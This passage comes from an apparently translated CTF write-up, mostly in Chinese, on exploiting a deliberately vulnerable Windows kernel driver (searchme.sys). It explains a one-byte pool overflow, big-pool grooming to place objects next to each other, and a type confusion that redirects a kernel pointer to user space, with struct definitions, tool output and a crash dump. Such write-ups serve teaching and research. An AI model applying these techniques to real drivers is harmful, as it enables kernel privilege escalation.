      const char kSearchedByte = 0;
      if (output_buffer[calculated] == kSearchedByte) {
        // Print input_buffer.
      }
    }
根据所需的值，可以操作input_buffer的长度和输入数字的范围。对于简单的0x00值，只需在[0,9]范围内使用5个数字就可以实现所需的效果：
    C:> brute.exe
    calculated: 4, written: 11, last byte: 0x00
    input_buffer = {0, 1, 1, 1, 2}
    calculated: 1, written: 4, last byte: 0x00
    input_buffer = {0, 3, 4, 5, 5}
    calculated: 1, written: 4, last byte: 0x00
    input_buffer = {5, 7, 8, 9, 9}
    [...]
有了选择溢出我们分配的单个字节的能力，是时候将基元提升到一个更强大的字节了。
## Data-only pool 破坏
如今使用的大多数动态分配器将元数据放在分配的内存块前面，这在历史上促进了许多通用堆利用技术。另一方面，它现在可能会使对小溢出的利用变得困难，因为元数据将特定于应用程序的对象彼此分离，并且常常受到广泛的完整性检查。必须在此提及以下两点参考：
[_A Heap of Trouble: Breaking the Linux Kernel SLOB
Allocator_](https://www.vsecurity.com/download/papers/slob-exploitation.pdf)
(Dan Rosenberg, 2012) and [_The poisoned NUL byte, 2014
edition_](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html) (Chris Evans and Tavis Ormandy, 2014).
在他的[计划方案](https://github.com/niklasb/elgoog/#intended-solution),
Niklas还使用pool元数据破坏来混淆内核池分配器，因此有两个不同的对象相互重叠，以实现更有用的基元。
这是一种有效的方法，但是它要求开发人员意识到分配器的内部工作原理，并精确地设置pool的布局以保证可靠的开发。
作为个人偏好，我发现攻击特定于程序的对象比内部系统结构更容易，所以我凭直觉开始寻找解决这个问题的方法。
这可能是一个鲜为人知的事实，在Windows内核中，小的分配(适合于单个内存页)的处理方式与大内存页不同 ，对于一些过时但仍然相关的细节， 看
[_Kernel Pool Exploitation on Windows 7_](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf) (Tarjei Mandt, 2011) and
[_Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’
Pool_](http://www.alex-ionescu.com/?p=231) (Alex Ionescu, 2014).
在这个特定的例子中，我们感兴趣的是大池块的两个属性：
  * 元数据是分开存储的，所以分配从页面对齐的地址开始，比如`0xffffa803f5892000`。
  * 这些块通常在内存中相邻;例如，两个连续的`0x1000`大小的分配可以分别映射到`0xffffa803f5892000`和`0xffffa803f5893000`
在易受攻击的驱动程序中，我们可以精确地控制溢出的块的大小，直到大小为[0x10000](https://github.com/niklasb/elgoog/blob/master/searchme/index.c#L271)（16页）。
这足以将两个大的对象放在相邻的位置上，我们甚至可以确定相邻区域的精确对，这要归功于IOCTLs明显地返回所创建对象的内核模式地址。
我在CTF期间编写的一个简单工具成功地证实了这一点， 它创建了8个0x2000字节长的索引，并比较了它们的地址。产出与以下内容相似：
    C:>adjacent.exe
    [+] Source Index: ffffa803f2f79cb0
    [1] Adjacent objects: ffffa803f61db000 --> ffffa803f61dd000
    [2] Adjacent objects: ffffa803f61dd000 --> ffffa803f61df000
    [3] Adjacent objects: ffffa803f61df000 --> ffffa803f61e1000
    [4] Adjacent objects: ffffa803f61e1000 --> ffffa803f61e3000
    [5] Adjacent objects: ffffa803f61e3000 --> ffffa803f61e5000
    [6] Adjacent objects: ffffa803f61e5000 --> ffffa803f61e7000
    [7] Adjacent objects: ffffa803f61e7000 --> ffffa803f61e9000
正如您所看到的，所有对象实际上都是在一个连续的0x10000字节块中相互映射的。 如果我们随后释放所有其他对象，在pool中创建 “holes”
，并立即分配一个由驱动程序覆盖的相同大小的新块，那么溢出应该与相邻索引对象的第一个字节重叠。如图所示:
在这一点上，我们应该查看存储在第一字节中的信息类型。事实证明，它是一个32位整数的最小有效字节，它指示对象的类型（type-0规则型，type
-1压缩型）。常规对象的结构定义如下所示 ：
    struct _inverted_index {
      /* +0x00 */ int compressed;
      /* +0x08 */ _ii_token_table *table;
    };
如果压缩成员为非零，则结构的布局非常不同 ：
    struct _compressed_index {
      /* +0x00 */ int compressed;
      /* +0x04 */ int size;
      /* +0x08 */ int offsets[size];
      /* +0x?? */ char data[...];
    };
由于对象的类型为0x00000000或0x00000001，我们的单字节溢出使我们能够将对象的类型从`compressed_index` 改为
`inverted_index` 。 类型混淆有一些方便的基元-在上面的结构中，我们可以看到偏移量8处的表指针与offsets[0] 和offsets[1]
的项重叠。 偏移数组中的值是相对于压缩索引的压缩数据的偏移量，因此它们相对较小。在我们的测试中，它们分别等于0x558和0x56C。
当二者组合并理解为64位地址时 ，这两个值形成了以下指针 ：`0x0000056c00000558`.
它不是常规应用程序中经常看到的典型地址，但它是一个规范的用户模式地址，可以由程序使用简单的Virtualalloc调用。
换句话说，类型混淆允许用户将敏感的内核模式指针重定向到用户空间，并对由驱动程序使用的_II_Token_Table结构进行完全控制。
如果我们在poc中实现了所讨论的逻辑，将对象的类型从1更改为0，然后尝试向损坏的索引中添加一个新的(keyword,
value)对，则在searchme.sys尝试从0x0000056c00000558取消引用内存时，我们应该观察到以下系统崩溃：
    SYSTEM_SERVICE_EXCEPTION (3b)
    An exception happened while executing a system service routine.
    Arguments:
    Arg1: 00000000c0000005, Exception code that caused the bugcheck
    Arg2: fffff8008b981fea, Address of the instruction which caused the bugcheck
    Arg3: ffff948fa7516c60, Address of the context record for the exception that caused the bugcheck
    Arg4: 0000000000000000, zero.
    [...]
    CONTEXT:  ffff948fa7516c60 -- (.cxr 0xffff948fa7516c60)
    rax=000000009b82a44c rbx=ffffcc8a26af7370 rcx=0000056c00000558
    rdx=0000000000000000 rsi=ffffcc8a273fc20c rdi=ffff948fa75177d4
    rip=fffff8008b981fea rsp=ffff948fa7517650 rbp=ffffcc8a2876fef0
     r8=0000000000000001  r9=0000000000000014 r10=0000000000000000
    r11=0000000000000000 r12=ffffcc8a2876fef0 r13=ffffcc8a29470180
    r14=0000000000000002 r15=0000000000000000
    iopl=0         nv up ei pl zr na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
    searchme+0x1fea:
    fffff800`8b981fea 48f77108        div     rax,qword ptr [rcx+8] ds:002b:0000056c`00000560=????????????????
让我们更仔细地研究受控的 `_ii_token_table` 结构所提供的功能。
## 拿到一个任意写的身份
基于elgoog符号文件，我恢复了_II_Token_table和相关的_II_POST_List结构的原型，并将它们写成以下C定义：
    struct _ii_posting_list {
      char token[16];
      unsigned __int64 size;
      unsigned __int64 capacity;
      unsigned int data[1];
    };
    struct _ii_token_table {
      unsigned __int64 size;
      unsigned __int64 capacity;
      _ii_posting_list *slots[1];